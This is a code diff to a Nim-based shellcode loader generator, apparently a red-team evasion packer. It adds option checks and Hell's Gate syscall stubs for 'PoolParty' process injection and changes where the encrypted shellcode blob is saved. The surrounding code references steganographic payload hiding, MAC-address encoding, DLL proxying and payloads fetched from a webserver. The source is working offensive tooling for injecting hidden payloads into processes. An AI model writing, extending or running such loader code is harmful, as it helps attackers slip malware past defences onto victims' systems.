@@ -871,6 +871,23 @@ if((existingprocessInjection == false) and (remoteinject) and jmpEntry):
         echo "Error: You can only use ntdll.dll functions for SpawnInject, because the Process is suspended and only ntdll.dll is loaded. Other DLLs can only be used when using --remoteprocess for Processes, that already have the target DLL loaded!"
         quit(1)
 
+# poolparty can only be used with remoteinject
+if (usepoolparty and remoteinject == false):
+    echo "Error: You can only use --poolparty with --remoteinject!"
+    quit(1)
+
+# poolparty 1 fails in combination with Caro-Kann
+if (usepoolparty and carokann and poolparty == 1):
+    echo "Error: You cannot use --poolparty 1 with --Caro-Kann!"
+    quit(1)
+
+# cannot use poolparty in combination with threadlessinject
+if (usepoolparty and threadless):
+    echo "Error: You cannot use --poolparty with --threadless!"
+    quit(1)
+
+
+
 if (psout and dll_out):
     # Reflective DLL PE-Loading only works, when DLLMain is exposed, otherwise it won't work
     dllhijack = true
@@ -1261,10 +1278,20 @@ ectx.init(key)
 ectx.encrypt(plaintext, enctext)
 ectx.clear()
 
-echo "Writing encrypted blob to disk: "
 
 var content: string = cast[string](enctext)
-writeFile(shellcodeFile[0], content)
+# if shellcodeFile[0] contains a PATH with \, we remove the path including the last \ so that the encrypted payload will land in the CWD
+var outStringShellcode: string = ""
+if (shellcodeFile[0].contains("\\")):
+    # replace everything before the last \ with nothing
+    # Get the filename from the path
+    let (_, filename) = splitPath(shellcodeFile[0])
+    outStringShellcode = filename
+else:
+    outStringShellcode = shellcodeFile[0]
+
+echo "Writing encrypted blob to disk: " & outStringShellcode
+writeFile(outStringShellcode, content)
 
 
 ### stego stuff, credit to @OffenseTeacher, https://github.com/OffenseTeacher/Steganim
@@ -1375,7 +1402,7 @@ if(useStego):
         echo "[*] Image Name: " & imageName
 
     var 
-        inputPayload = shellcodeFile[0]
+        inputPayload = outStringShellcode
         inputBaseImage = stegofile
         outputSteganoFile = stegofile
     echo "[*] Creating Stegano Image:"
@@ -1390,11 +1417,11 @@ if(useStego):
 
 if(macPayload):
     echo "[*] Converting Shellcode to MAC-Adresses: "
-    echo fmt"{packerPath}\bin2mac\bin2mac.exe {packerPath}\{shellcodeFile[0]}"
+    echo fmt"{packerPath}\bin2mac\bin2mac.exe {packerPath}\{outStringShellcode}"
     when system.hostOS == "linux":
-        macPayloadString = exec_cmd_ex(fmt"{packerPath}/bin2mac/bin2mac.py {packerPath}/{shellcodeFile[0]}")[0]
+        macPayloadString = exec_cmd_ex(fmt"{packerPath}/bin2mac/bin2mac.py {packerPath}/{outStringShellcode}")[0]
     when system.hostOS == "windows":
-        macPayloadString = exec_cmd_ex(fmt"{packerPath}\bin2mac\bin2mac.exe {packerPath}\{shellcodeFile[0]}")[0]
+        macPayloadString = exec_cmd_ex(fmt"{packerPath}\bin2mac\bin2mac.exe {packerPath}\{outStringShellcode}")[0]
     #echo macPayloadString
 
 
@@ -3688,6 +3715,11 @@ if(hellsgate):
     stub.add(HellsgateNtCloseDelegate)
     stub.add(HellsgateNtReadVirtualMemoryDelegate)
     stub.add(HellsgateNtFreeVirtualMemoryDelegate)
+    # if use poolparty add hellsgate poolparty stubs
+    if (usepoolparty):
+        stub.add(HellsgateZwAssociateWaitCompletionPacketDelegate)
+        stub.add(HellsgateNtSetInformationWorkerFactoryDelegate)
+        stub.add(HellsgateZwSetIoCompletionDelegate)
     if(remoteMapSection):
         stub.add(HellsgateNtMapViewOfSectionDelegate)
         stub.add(HellsgateNtCreateSectionDelegate)
@@ -4539,7 +4571,7 @@ if(exists):
     let msg = fmt"[!] Loader saved to {outfile}"
     echo "\n" & msg
     if(retrieveFromFile):
-        echo fmt"[!] Encrypted Payload saved to {shellcodeFile[0]}"
+        echo fmt"[!] Encrypted Payload saved to {outStringShellcode}"
     if (callobfs):
         when system.hostOS == "windows":
             var outfileonlyname = outfile.replace(packerPath, "")
@@ -4584,7 +4616,7 @@ if(exists):
                 writeFile(fmt"{outfile}",pumpsequence)
 
     if (retrieveFromURL):
-        echo fmt"[!] Make sure to host the {shellcodeFile[0]} file on your webserver with the correct filename to have a working payload ;-)"
+        echo fmt"[!] Make sure to host the {outStringShellcode} file on your webserver with the correct filename to have a working payload ;-)"
 
     if (dllProxy):
         echo fmt"[!] Original DLL saved as {randValue}.dll - you need to copy both files into the target directory to have a working payload ;-)"
